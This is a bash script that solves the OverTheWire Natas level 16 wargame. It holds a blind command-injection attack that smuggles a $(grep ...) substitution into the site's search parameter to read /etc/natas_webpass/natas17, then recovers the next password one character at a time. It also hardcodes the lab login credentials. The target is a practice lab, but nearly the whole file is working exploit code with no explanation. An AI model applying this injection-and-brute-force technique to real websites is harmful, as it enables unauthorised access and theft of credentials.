#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute_force attack";

while true; do
for f in {a..z} {A..Z} {0..9}; do
    curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 'http://natas16.natas.labs.overthewire.org/?needle=test%24(grep+^'$password$f'+%2Fetc%2Fnatas_webpass%2Fnatas17)&submit=Search' | grep smartest > /dev/null
    if [ $? -ne 0 ]
    then
       password=$password$f;
       break
    fi
done
echo $password;
done

